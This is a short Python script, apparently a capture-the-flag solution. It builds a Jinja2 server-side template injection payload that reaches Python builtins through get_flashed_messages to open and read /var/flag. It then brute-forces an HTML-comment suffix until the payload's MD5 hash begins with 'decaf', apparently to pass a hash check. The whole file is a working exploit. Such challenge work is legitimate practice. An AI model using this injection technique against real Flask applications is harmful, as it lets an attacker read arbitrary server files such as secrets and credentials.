#!/bin/python3
import hashlib
import string

payload = '{{ get_flashed_messages.__globals__.__builtins__.open("/var/flag").read() }}'

def gen(i):
    o = ''
    while i != 0:
        o += string.printable[i%len(string.printable)]
        i //= len(string.printable)
    return '<!--' + o + '-->'

def bf(n):
    for i in range(n):
        pl = payload + gen(i)
        h = hashlib.md5(pl.encode()).hexdigest()[:5]
        print(h, i, end='\r')
        if h == 'decaf':
            print('found', pl.encode(), i)
            return
    print('failed!')

if __name__=="__main__":
    bf(10**7)
